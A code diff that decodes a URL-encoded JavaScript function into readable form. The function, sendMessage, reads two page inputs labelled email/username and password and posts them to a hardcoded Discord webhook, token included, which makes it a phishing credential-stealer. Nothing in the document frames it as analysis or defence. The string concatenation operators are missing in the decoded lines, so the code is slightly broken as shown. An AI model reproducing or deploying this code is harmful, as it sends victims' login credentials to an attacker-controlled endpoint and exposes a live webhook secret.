@@ -1,1 +1,24 @@
-function%20sendMessage()%20%7B%0A%20%20%20%20var%20input1%20%3D%20document.getElementById(%22input1%22).value%3B%0A%20%20%20%20var%20input2%20%3D%20document.getElementById(%22input2%22).value%3B%0A%20%20%0A%20%20%20%20var%20data%20%3D%20%7B%0A%20%20%20%20%20%20content%3A%20%22Email%2FUsername%3A%20%22%20%20%20input1%20%20%20%22%5Cn%20Password%3A%20%22%20%20%20input2%0A%20%20%20%20%7D%3B%0A%20%20%0A%20%20%20%20fetch(%27https%3A%2F%2Fdiscord.com%2Fapi%2Fwebhooks%2F1215877256078164049%2Fx6cxJ-W_hJ5Podi18YGq7SU4vzQiPyjPIUJ2E2rFTl6cxFNcSXZw7jqvshQOeCJ77eLy%27%2C%20%7B%0A%20%20%20%20%20%20method%3A%20%27POST%27%2C%0A%20%20%20%20%20%20headers%3A%20%7B%0A%20%20%20%20%20%20%20%20%27Content-Type%27%3A%20%27application%2Fjson%27%2C%0A%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20body%3A%20JSON.stringify(data)%2C%0A%20%20%20%20%7D)%0A%20%20%20%20.then(response%20%3D%3E%20%7B%0A%20%20%20%20%20%20if%20(!response.ok)%20%7B%0A%20%20%20%20%20%20%20%20console.error(%27Error%20sending%20message%20to%20Discord%3A%27%2C%20response)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D)%0A%20%20%20%20.catch(error%20%3D%3E%20%7B%0A%20%20%20%20%20%20console.error(%27Error%20sending%20message%20to%20Discord%3A%27%2C%20error)%3B%0A%20%20%20%20%7D)%3B%0A%7D%0A
+function sendMessage() {
+    var input1 = document.getElementById("input1").value;
+    var input2 = document.getElementById("input2").value;
+  
+    var data = {
+      content: "Email/Username: "   input1   "\n Password: "   input2
+    };
+  
+    fetch('https://discord.com/api/webhooks/1215877256078164049/x6cxJ-W_hJ5Podi18YGq7SU4vzQiPyjPIUJ2E2rFTl6cxFNcSXZw7jqvshQOeCJ77eLy', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(data),
+    })
+    .then(response => {
+      if (!response.ok) {
+        console.error('Error sending message to Discord:', response);
+      }
+    })
+    .catch(error => {
+      console.error('Error sending message to Discord:', error);
+    });
+}
